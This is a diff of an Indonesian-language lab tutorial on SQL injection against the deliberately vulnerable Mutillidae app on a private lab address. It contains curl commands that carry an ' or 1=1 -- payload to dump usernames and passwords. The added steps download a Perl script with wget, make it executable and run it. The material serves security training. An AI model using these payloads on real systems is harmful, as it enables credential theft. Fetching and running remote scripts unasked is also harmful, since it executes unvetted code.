@@ -66,15 +66,30 @@
 
 ## Simulate CURL SQL Injection: (Method #2)
 1. Use Curl to Display Usernames and Passwords
- - Buka terminal, jalankan perintah berikut : 
+   - Buka terminal, jalankan perintah berikut : 
  ```
- curl -b crack_cookies2.txt -c crack_cookies2.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
+   curl -b crack_cookies2.txt -c crack_cookies2.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep -i "Username=" | awk 'BEGIN{FS="<"}{for (i=1; i<=NF; i++) print $i}' | awk -F\> '{print $2}'
  ```
 
 ## Perl Parser
- - Buka terminal, jalankan perintah berikut :
+   - Buka terminal, jalankan perintah berikut :
  ```
-	cd /root
-	curl -b crack_cookies2.txt -c crack_cookies2.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep "Username=" > lesson7.txt
-	cat lesson7.txt
+   cd /root
+   curl -b crack_cookies2.txt -c crack_cookies2.txt --user-agent "Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)" --data "page=user-info.php&username=%27+or+1%3D1+--+&password=&user-info-php-submit-button=View+Account+Details" --location "http://10.0.1.100/mutillidae/index.php" | grep "Username=" > lesson7.txt
+   cat lesson7.txt
  ```
+
+## Download Parser
+   - Buka terminal, jalankan perintah berikut :
+   ```
+   cd /root
+   wget http://www.computersecuritystudent.com/SECURITY_TOOLS/MUTILLIDAE/MUTILLIDAE_2511/lesson7/lesson7.pl.TXT
+   mv lesson7.pl.TXT lesson7.pl
+   chmod 700 lesson7.pl
+   ```
+
+## Run Perl Script
+   - Buka terminal, jalankan perintah berikut :
+   ```
+   ./lesson7.pl
+   ```
